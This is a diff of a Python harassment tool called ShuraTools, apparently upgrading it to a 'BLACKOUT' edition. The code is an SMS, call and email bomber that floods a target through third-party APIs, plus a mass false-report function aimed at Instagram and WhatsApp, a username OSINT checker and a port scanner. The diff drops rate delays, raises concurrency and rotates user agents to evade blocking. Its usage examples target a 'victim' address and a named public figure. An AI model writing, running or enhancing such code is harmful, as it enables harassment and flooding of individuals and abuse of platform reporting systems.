@@ -1,39 +1,44 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ShuraTools v12.0 ULTIMATE CLI EDITION
-Flags: --sms --call --email --ig --zap --osint --scan --target --qty --threads --delay
-Ex: python ShuraTools.py --sms --target 5511999999999 --qty 30 --threads 10 --delay 2
+ShuraTools v13.0 BLACKOUT EDITION
+Usage: python ShuraTools.py --sms --target 5511999999999 --qty 1000 --threads 500
 """
 
-import os, sys, time, random, argparse, threading, socket
+import asyncio, aiohttp, random, argparse, time, socket, os, sys, string, threading
 from concurrent.futures import ThreadPoolExecutor
 
 try:
-    import requests
     from colorama import Fore, Style, init
     init(autoreset=True)
 except ImportError:
-    print("[!] pip install requests colorama")
+    print("[!] pip install colorama aiohttp")
     sys.exit(1)
 
 BANNER = f"""
-{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
-{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
-{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
-{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
-{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
-{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-{Fore.YELLOW}  SMS | Call | Email | IG | Zap | OSINT | Scan
-{Fore.WHITE}     v12.0 ULTIMATE CLI EDITION - by Shura
+{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ {Fore.WHITE}██████╗ ██╗  ██╗
+{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗{Fore.WHITE}██╔══██╗██║  ██║
+{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║{Fore.WHITE}██████╔╝███████║
+{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║{Fore.WHITE}██╔═══╝ ██╔══██║
+{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║{Fore.WHITE}██║     ██║  ██║
+{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.WHITE}╚═╝     ╚═╝  ╚═╝
+{Fore.YELLOW}SMS | Call | Email | IG | Zap | OSINT | Scan
+{Fore.WHITE}v13.0 BLACKOUT EDITION - by Shura
 """
 
-LOCK = threading.Lock()
 stats = {"success": 0, "fail": 0}
+LOCK = threading.Lock()
+
+UA_LIST = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0"
+]
 
 def log(m, t="i"):
-    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
-    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")
+    c = {"i":Fore.WHITE+"[*] ", "s":Fore.GREEN+"[+] ", "e":Fore.RED+"[-] ", "w":Fore.YELLOW+"[!] "}
+    with LOCK: print(f"{c.get(t)}{m}{Style.RESET_ALL}")
 
 # ========== API DATABASE ==========
 APIS = {
@@ -58,68 +63,74 @@ APIS = {
     ]
 }
 
-# ========== BOMBER ENGINE ==========
-def bomber(target, mode, qty, threads, delay):
+# ========== ASYNC BOMBER ==========
+async def bomber_async(target, mode, qty, threads):
     global stats
     stats = {"success": 0, "fail": 0}
     apis = APIS.get(mode, [])
     
-    log(f"Iniciando {mode.upper()} Bomber", "w")
-    log(f"Target: {target} | Qty: {qty} | Threads: {threads} | Delay: {delay}s", "i")
+    log(f"Iniciando {mode.upper()} Bomber ASYNC", "w")
+    log(f"Target: {target} | Qty: {qty} | Threads: {threads}", "i")
     
-    def attack(api, idx):
-        try:
-            data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
-            res = requests.post(api["u"], json=data, headers=api["h"], timeout=10)
-            
-            if res.status_code < 400:
-                with LOCK: stats["success"] += 1
-                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
-            else:
-                with LOCK: stats["fail"] += 1
-                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
-            
-            time.sleep(delay)
-        except:
-            with LOCK: stats["fail"] += 1
-            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
+    sem = asyncio.Semaphore(threads)
     
-    with ThreadPoolExecutor(max_workers=threads) as exe:
-        for i in range(qty):
-            exe.submit(attack, random.choice(apis), i)
+    async def attack(api, idx):
+        async with sem:
+            try:
+                headers = {**api["h"], "User-Agent": random.choice(UA_LIST)}
+                data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
+                
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(api["u"], json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as res:
+                        if res.status < 400:
+                            stats["success"] += 1
+                            log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
+                        else:
+                            stats["fail"] += 1
+                            log(f"[{idx+1}/{qty}] {api['n']} → {res.status}", "w")
+            except:
+                stats["fail"] += 1
+                log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
+    
+    tasks = [attack(random.choice(apis), i) for i in range(qty)]
+    await asyncio.gather(*tasks)
     
     log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")
 
-# ========== MASS REPORT ==========
-def mass_report(target, platform, qty, threads):
-    log(f"{platform.upper()} Mass Report: {target}", "w")
+# ========== MASS REPORT ASYNC ==========
+async def mass_report_async(target, platform, qty, threads):
+    log(f"{platform.upper()} Mass Report ASYNC: {target}", "w")
     
     if platform == "ig":
         url = "https://i.instagram.com/api/v1/users/web_report/"
         data = {"username": target, "source_name": "profile", "reason_id": "spam"}
-    else:  # zap
+    else:
         url = "https://v.whatsapp.net/v2/report"
         data = {"phone": target, "reason": "spam"}
     
-    def report(idx):
-        try:
-            res = requests.post(url, data=data, headers={"User-Agent": "Instagram 150.0.0.0"}, timeout=5)
-            if res.status_code < 400:
-                log(f"Report {idx+1}/{qty} → OK", "s")
-            else:
-                log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
-        except:
-            log(f"Report {idx+1}/{qty} → Timeout", "e")
+    sem = asyncio.Semaphore(threads)
     
-    with ThreadPoolExecutor(max_workers=threads) as exe:
-        for i in range(qty):
-            exe.submit(report, i)
-            time.sleep(0.5)
+    async def report(idx):
+        async with sem:
+            try:
+                headers = {"User-Agent": random.choice(UA_LIST)}
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as res:
+                        if res.status < 400:
+                            log(f"Report {idx+1}/{qty} → OK", "s")
+                        else:
+                            log(f"Report {idx+1}/{qty} → {res.status}", "w")
+            except:
+                log(f"Report {idx+1}/{qty} → Timeout", "e")
+    
+    tasks = [report(i) for i in range(qty)]
+    await asyncio.gather(*tasks)
 
-# ========== OSINT ==========
-def osint(target):
-    log(f"OSINT Hunter: {target}", "w")
+# ========== OSINT DEEP ASYNC ==========
+async def osint_deep_async(target):
+    log(f"OSINT Deep ASYNC: {target}", "w")
     u = target.replace("@", "")
+    
     platforms = {
         "Instagram": f"https://www.instagram.com/{u}/",
         "GitHub": f"https://github.com/{u}",
@@ -130,20 +141,36 @@ def osint(target):
         "Reddit": f"https://www.reddit.com/user/{u}",
         "YouTube": f"https://www.youtube.com/@{u}",
         "Twitch": f"https://www.twitch.tv/{u}",
-        "Medium": f"https://medium.com/@{u}"
+        "Medium": f"https://medium.com/@{u}",
+        "Pastebin": f"https://pastebin.com/u/{u}",
+        "Telegram": f"https://t.me/{u}",
+        "Spotify": f"https://open.spotify.com/user/{u}",
+        "Pinterest": f"https://www.pinterest.com/{u}",
+        "Tumblr": f"https://{u}.tumblr.com",
+        "Flickr": f"https://www.flickr.com/people/{u}",
+        "Vimeo": f"https://vimeo.com/{u}",
+        "SoundCloud": f"https://soundcloud.com/{u}",
+        "DeviantArt": f"https://www.deviantart.com/{u}",
+        "Steam": f"https://steamcommunity.com/id/{u}"
     }
     
     print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-    for name, url in platforms.items():
+    
+    async def check(name, url):
         try:
-            r = requests.get(url, timeout=5)
-            if r.status_code == 200:
-                log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
-                print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
-            else:
-                log(f"{name}: Não encontrado", "i")
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
+                    if r.status == 200:
+                        log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
+                        print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
+                    else:
+                        log(f"{name}: Não encontrado", "i")
         except:
             log(f"{name}: Timeout", "e")
+    
+    tasks = [check(name, url) for name, url in platforms.items()]
+    await asyncio.gather(*tasks)
+    
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
 
 # ========== PORT SCANNER ==========
@@ -168,52 +195,42 @@ def port_scan(target):
 def main():
     print(BANNER)
     
-    ap = argparse.ArgumentParser(description="ShuraTools - Ultimate CLI Edition")
-    ap.add_argument("--sms", action="store_true", help="SMS Bomber")
-    ap.add_argument("--call", action="store_true", help="Call Bomber")
-    ap.add_argument("--email", action="store_true", help="Email Bomber")
-    ap.add_argument("--ig", action="store_true", help="Instagram Mass Report")
-    ap.add_argument("--zap", action="store_true", help="WhatsApp Mass Report")
-    ap.add_argument("--osint", action="store_true", help="OSINT Hunter")
+    ap = argparse.ArgumentParser(description="ShuraTools v13.0 BLACKOUT")
+    ap.add_argument("--sms", action="store_true", help="SMS Bomber ASYNC")
+    ap.add_argument("--call", action="store_true", help="Call Bomber ASYNC")
+    ap.add_argument("--email", action="store_true", help="Email Bomber ASYNC")
+    ap.add_argument("--ig", action="store_true", help="Instagram Mass Report ASYNC")
+    ap.add_argument("--zap", action="store_true", help="WhatsApp Mass Report ASYNC")
+    ap.add_argument("--osint", action="store_true", help="OSINT Deep ASYNC")
     ap.add_argument("--scan", action="store_true", help="Port Scanner")
-    ap.add_argument("--target", required=True, help="Alvo (email, phone, @user, IP)")
-    ap.add_argument("--qty", type=int, default=20, help="Quantidade (padrão: 20)")
-    ap.add_argument("--threads", type=int, default=5, help="Threads (padrão: 5)")
-    ap.add_argument("--delay", type=float, default=2.0, help="Delay em segundos (padrão: 2)")
+    ap.add_argument("--target", required=True, help="Alvo")
+    ap.add_argument("--qty", type=int, default=100, help="Quantidade (padrão: 100)")
+    ap.add_argument("--threads", type=int, default=100, help="Threads (padrão: 100)")
     
     args = ap.parse_args()
     
-    # Executa as ações
+    # Executa com asyncio
     if args.sms:
-        bomber(args.target, "sms", args.qty, args.threads, args.delay)
-    
-    if args.call:
-        bomber(args.target, "call", args.qty, args.threads, args.delay)
-    
-    if args.email:
-        bomber(args.target, "email", args.qty, args.threads, args.delay)
-    
-    if args.ig:
-        mass_report(args.target, "ig", args.qty, args.threads)
-    
-    if args.zap:
-        mass_report(args.target, "zap", args.qty, args.threads)
-    
-    if args.osint:
-        osint(args.target)
-    
-    if args.scan:
+        asyncio.run(bomber_async(args.target, "sms", args.qty, args.threads))
+    elif args.call:
+        asyncio.run(bomber_async(args.target, "call", args.qty, args.threads))
+    elif args.email:
+        asyncio.run(bomber_async(args.target, "email", args.qty, args.threads))
+    elif args.ig:
+        asyncio.run(mass_report_async(args.target, "ig", args.qty, args.threads))
+    elif args.zap:
+        asyncio.run(mass_report_async(args.target, "zap", args.qty, args.threads))
+    elif args.osint:
+        asyncio.run(osint_deep_async(args.target))
+    elif args.scan:
         port_scan(args.target)
-    
-    # Se nenhuma flag foi passada, mostra help
-    if not any([args.sms, args.call, args.email, args.ig, args.zap, args.osint, args.scan]):
+    else:
         ap.print_help()
-        print(f"\n{Fore.YELLOW}Exemplos de uso:{Style.RESET_ALL}")
-        print(f"  python ShuraTools.py --sms --target 5511999999999 --qty 30 --threads 10 --delay 2")
-        print(f"  python ShuraTools.py --email --target vitima@gmail.com --qty 50 --delay 1")
-        print(f"  python ShuraTools.py --ig --target elonmusk --qty 100")
+        print(f"\n{Fore.YELLOW}Exemplos:{Style.RESET_ALL}")
+        print(f"  python ShuraTools.py --sms --target 5511999999999 --qty 1000 --threads 500")
+        print(f"  python ShuraTools.py --email --target vitima@gmail.com --qty 500 --threads 200")
+        print(f"  python ShuraTools.py --ig --target elonmusk --qty 200 --threads 100")
         print(f"  python ShuraTools.py --osint --target elonmusk")
-        print(f"  python ShuraTools.py --scan --target google.com")
 
 if __name__ == "__main__":
     main()
